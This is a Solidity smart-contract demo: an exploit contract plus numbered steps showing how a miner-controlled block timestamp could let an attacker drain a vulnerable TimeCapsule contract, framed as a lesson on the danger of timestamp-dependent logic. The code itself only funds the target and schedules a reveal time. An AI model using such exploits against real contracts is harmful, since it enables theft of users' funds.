// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
This contract demonstrates how an attacker could exploit the TimeCapsule contract's reliance on block.timestamp. By interacting with the TimeCapsule contract and then manipulating the timestamp of a mined block, an attacker can ensure that the timestamp aligns with the target reveal time, thus winning all the Ether stored in the contract.

Steps to exploit:
1. Deploy TimeCapsuleExploit and send some Ether.
2. Call the exploit function with the address of the vulnerable TimeCapsule contract.
3. If you control a miner or a mining pool, include a transaction in a block with a timestamp that matches the reveal condition.

This exploit highlights the dangers of using block.timestamp for critical contract logic and emphasizes the importance of considering miner influence in contract design.
*/

interface ITimeCapsule {
    function storeMessage(string calldata _message, uint256 _revealTime) external payable;
    function revealMessages() external;
}

contract TimeCapsuleExploit {
    function exploit(address _timeCapsuleAddress) external payable {
        require(msg.value >= 1 ether, "Send at least 1 Ether to fund the message.");
        ITimeCapsule timeCapsule = ITimeCapsule(_timeCapsuleAddress);

        // Calculate a future time that is a multiple of 10 minutes
        uint256 targetRevealTime = block.timestamp + (10 minutes - (block.timestamp % 10 minutes));
        
        timeCapsule.storeMessage{value: msg.value}("This is an exploit message.", targetRevealTime);
        // The attacker would then manipulate the timestamp of the next block mined to be exactly `targetRevealTime`
    }
}
